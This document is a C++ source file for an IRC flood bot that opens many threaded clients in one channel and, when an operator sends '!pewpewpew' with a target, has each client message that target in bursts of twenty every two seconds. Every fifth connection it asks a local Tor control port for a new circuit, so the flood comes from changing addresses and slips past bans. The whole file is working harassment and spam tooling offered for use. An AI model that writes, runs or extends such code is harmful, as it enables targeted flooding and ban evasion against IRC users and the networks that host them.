#include <iostream>
#include <thread>
#include <regex>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <string>
#include <boost/regex.hpp>

#define writeS(fd, data) write(fd, data, strlen(data))
#define MAXSIZE 5120

using namespace std;

char *shift( int mov, char * array, int size );
void irc_connect( const char * server, const char * port, const char * channel, const char * nick, int num );
void resetIP( );

/**

This code is sorta fucked right now. It works but there is a room for improvement
g++ -o first first.cpp -std=c++11 -lboost_regex -pthread -lpthread -Wl,--no-as-needed

**/

class Socket{
	
	private:
		char buffer[MAXSIZE];
		int sock;

	public:
		int SockCon( const char *host , const char *port ){

			struct addrinfo hints, *addr;
			memset(&hints, 0 , sizeof( struct addrinfo ));
			hints.ai_family = AF_INET;
			hints.ai_socktype  = SOCK_STREAM;

			if(getaddrinfo( host, port, &hints, &addr ) == 0){

				sock = socket( addr->ai_family,
						addr->ai_socktype,	
						addr->ai_protocol );

				if ( sock >= 0 ){

					if ( connect(sock, addr->ai_addr, addr->ai_addrlen) >= 0 ) return sock;
					throw "Cant connect()";

				}
		
			}

			throw "getaddrinfo failed";	

			
		}
		char * getData( ){ 
	       
			memset(&buffer, 0, sizeof(buffer));
			if( read(sock, &buffer, sizeof(buffer)) == 0) throw "Connection closed";
			return buffer;
		}
		void sendData( char * data ){
			char buff[MAXSIZE];
			sprintf(buff, "%s\r\n", data);
			if(writeS( sock, buff ) == -1 ) throw "Connection closed";
			memset(&buff, 0, sizeof(buff));
		}

		~Socket(){
		
			close(sock);
		}

};

class IRC: public Socket{


	public:
		void connect(const char *host , const char *port, const char *n, const char *channel){

			name =  (char *)n;
			chan = (char *)channel; 
			SockCon( host , port );
			main();
		}
		void privmsg( char *who, const char *data = "Trolololololo"){

			char buff[MAXSIZE];
			sprintf(buff, "PRIVMSG %s :%s ", who ,data);
			sendData( buff );
			memset(&buff, 0, sizeof(buff));	
		}
		void join( char *chan ){

			char buff[MAXSIZE];
			sprintf(buff, "JOIN %s", chan);
			sendData( buff );
			memset(&buff, 0 , sizeof(buff));
		}
		void part(  char *chan, const char * msg = "Leaving"){

			char buff[MAXSIZE];
			sprintf(buff, "PART %s :%s", chan, msg);
			sendData( buff );
			memset(&buff, 0 , sizeof(buff));	
		}
		void nick( char *n ){

			char buff[MAXSIZE];
			sprintf(buff, "NICK %s", n);
			sendData( buff );
			memset(&buff, 0 , sizeof(buff));
		}
	private: 
		char *name;
		char *chan;
		bool spam = false;
		char *who;
		void pong( char *data, int size ){
 
			char buff[MAXSIZE];
			char *x = shift(5, data, size);
			sprintf(buff, "PONG %s", x );
			free(x);
			sendData( buff );
			memset(&buff, 0, sizeof(buff));
		}
		void user( const char *user = " Ass Ass  Ass ASs" ){

			char buff[MAXSIZE];
			sprintf(buff, "USER %s", user);
			sendData( buff );
			memset(&buff, 0 , sizeof(buff));
		}
		void main( )
		{

			nick( name );
			user();

			while( 1 ){

				char * buff = getData();
				cout << buff;
				if ( strstr( buff, "004") !=NULL )
				{	
					cout << "Authenticated" << endl;
					break;
				}
				else if( strstr( buff, "PING :") !=NULL )
				{
					pong( buff , strlen(buff));
				}
				else if( strstr( buff, "433" ) !=NULL )
				{
					sprintf(name, "%s_", name);
					nick(name);
				}

				memset(&buff, 0 , sizeof(buff));

			}

			join( chan );

			while( 1 ){
				char * buff = getData();
				cout << buff;
				if( strstr( buff, "PING :") !=NULL )
				{
					pong( buff , strlen(buff));
				}
				else if ( strstr( buff, " PRIVMSG ") !=NULL )
				{
					string shit(buff);
					boost::regex pattern(":(.*)!(.*) PRIVMSG (.*):(.*) (.*) ");
					boost::smatch result;
					if (boost::regex_search(shit, result, pattern))
					{
						if(result[4] == "!pewpewpew")
						{
							cout << "Spamming: " << result[5] << endl;
							spam = true;
							string damm(result[5]);
							who = (char*)damm.c_str();
						}
						else if (result[4] == "!stop")
						{
							spam = false;

						}
					}

				}
				if ( spam == true )
				{

					for(int xyz = 0; xyz < 20; xyz++) privmsg(who);
					sleep(2);
				}
				else if ( who != NULL)
				{
					memset(&who, 0 , sizeof( who ));
				}
				memset(&buff, 0 , sizeof(buff));

			}
		}


};

int main(int argc, char const *argv[]){
	if (argc < 5 )
	{
		cout << "Usage: " << argv[0] << " <irc> <port> <channel> <threads>" << endl;
		return -1;
	}

	try{

		const char nick[20] = "poop";
		for(int i = 0; i < atoi(argv[4]) ; i++){

			if ( i % 5 == 0) resetIP();
			thread first(irc_connect, argv[1], argv[2], argv[3], nick, i); //  [] ( char * nick , int num ) ->{  ...  }
			first.detach();

		}

		while( 1 ){

			sleep(1);

		}
	}catch( char const* e ){

		cout << "Caught Exception: " << e << endl;

	}
	return 0;
}
void irc_connect( const char * server, const char * port, const char * channel, const char * nick, int num ){


	char name[MAXSIZE];
	sprintf(name, "%s%i", nick, num);
	memset(&nick, 0 , sizeof(nick));
	IRC * irc = new IRC();
	try{

		irc->connect( server, port, name, channel);

	}catch( char const * e ){

		cout  << name << " Caught Exception: "<< e << endl;
	}
	memset(&name, 0 , sizeof(name));
	delete irc;
	
}

char  *shift( int mov, char  * array, int size){
	
	int val = size - mov;
	char *n = (char*)malloc(val);

	for(int i =0;i < val ; i ++ ){
	
		n[i] = array[i+mov];
	
	}
	
	return n;

}

void resetIP( ){

	Socket * s = new Socket();
	s->SockCon( "localhost", "9051");
	s->sendData((char *)"AUTHENTICATE"); //cause lazy
	s->sendData((char *)"SIGNAL NEWNYM");
	
	delete s;
}
